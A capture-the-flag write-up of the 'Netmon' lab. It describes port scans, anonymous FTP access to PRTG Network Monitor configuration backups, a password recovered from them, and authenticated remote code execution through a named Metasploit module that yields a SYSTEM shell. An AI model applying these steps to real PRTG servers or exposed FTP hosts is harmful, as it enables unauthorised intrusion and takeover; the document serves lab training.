# Netmon
## Enumeration
I performed an Nmap port scan and discovered the following open ports:

```
PORT      STATE SERVICE
21/tcp    open  ftp
80/tcp    open  http
135/tcp   open  msrpc
139/tcp   open  netbios-ssn
445/tcp   open  microsoft-ds
5985/tcp  open  wsman
47001/tcp open  winrm
49664/tcp open  unknown
49665/tcp open  unknown
49666/tcp open  unknown
49667/tcp open  unknown
49668/tcp open  unknown
49669/tcp open  unknown
```

After discovering the open ports, I performed a more detailed scan with version and script detection:

```
PORT      STATE SERVICE      VERSION
21/tcp    open  ftp          Microsoft ftpd
| ftp-syst: 
|_  SYST: Windows_NT
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
| 02-03-19  12:18AM                 1024 .rnd
| 02-25-19  10:15PM       <DIR>          inetpub
| 07-16-16  09:18AM       <DIR>          PerfLogs
| 02-25-19  10:56PM       <DIR>          Program Files
| 02-03-19  12:28AM       <DIR>          Program Files (x86)
| 02-03-19  08:08AM       <DIR>          Users
|_11-10-23  10:20AM       <DIR>          Windows
80/tcp    open  http         Indy httpd 18.1.37.13946 (Paessler PRTG bandwidth monitor)
|_http-trane-info: Problem with XML parsing of /evox/about
| http-title: Welcome | PRTG Network Monitor (NETMON)
|_Requested resource was /index.htm
|_http-favicon: Unknown favicon MD5: 36B3EF286FA4BEFBB797A0966B456479
|_http-server-header: PRTG/18.1.37.13946
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
135/tcp   open  msrpc        Microsoft Windows RPC
139/tcp   open  netbios-ssn  Microsoft Windows netbios-ssn
445/tcp   open  microsoft-ds Microsoft Windows Server 2008 R2 - 2012 microsoft-ds
5985/tcp  open  http         Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-title: Not Found
|_http-server-header: Microsoft-HTTPAPI/2.0
47001/tcp open  http         Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
49664/tcp open  msrpc        Microsoft Windows RPC
49665/tcp open  msrpc        Microsoft Windows RPC
49666/tcp open  msrpc        Microsoft Windows RPC
49667/tcp open  msrpc        Microsoft Windows RPC
49668/tcp open  msrpc        Microsoft Windows RPC
49669/tcp open  msrpc        Microsoft Windows RPC
```
The scan gave me information about the OS and was: Windows.

## Exploitation

### FTP (Port 21)
The FTP server allowed anonymous access, and I found the user flag here. To access the FTP server, I used the following command:

```bash
ftp <TARGET IP>
```

With anonymous as the username and a blank password, I logged in and listed the directory contents, starting from the C:\ drive.

I discovered the configuration files for the PRTG Network Monitor in C:\ProgramData\Paessler\PRTG Network Monitor. The relevant files were:

```
02-25-19  10:54PM              1189697 PRTG Configuration.dat
02-25-19  10:54PM              1189697 PRTG Configuration.old
07-14-18  03:13AM              1153755 PRTG Configuration.old.bak
```

By searching through **PRTG Configuration.old.bak** for the keyword **prtgadmin**, I found an old password: **PrTg@dmin2018**. This password didn't work initially, but I noticed the date difference between the files. Adjusting the password to **PrTg@dmin2019** allowed me to log in to the PRTG Network Monitor web interface.

### HTTP (Port 80)
The web application was identified as PRTG Network Monitor 18.1.37.13946. Searching for known vulnerabilities, I found the following:

```
PRTG Network Monitor 18.2.38 - (Authenticated) Remote Code Execution | windows/webapps/46527.sh
```

Using Metasploit, I identified two relevant modules:

```
exploit/windows/http/prtg_authenticated_rce_cve_2023_32781
exploit/windows/http/prtg_authenticated_rce
```

I used the **exploit/windows/http/prtg_authenticated_rce** module. After setting the IPs and correct password, I successfully exploited the vulnerability and gained a meterpreter session.

## Post Exploitation
### Privilege Escalation
Some information gathered from the meterpreter session:

```
meterpreter > getuid
Server username: NT AUTHORITY\SYSTEM

meterpreter > sysinfo
Computer        : NETMON
OS              : Windows Server 2016 (10.0 Build 14393)
Architecture    : x64
System Language : en_US
Domain          : WORKGROUP
Logged On Users : 1
Meterpreter     : x86/windows
```

I successfully retrieved the root flag.

## Overview
This lab was relatively straightforward. The key steps included leveraging anonymous FTP access to retrieve configuration files and exploiting a known vulnerability in PRTG Network Monitor for remote code execution. The experience enhanced my understanding of FTP anonymous login, configuration file analysis, and exploiting RCE vulnerabilities in older software versions.
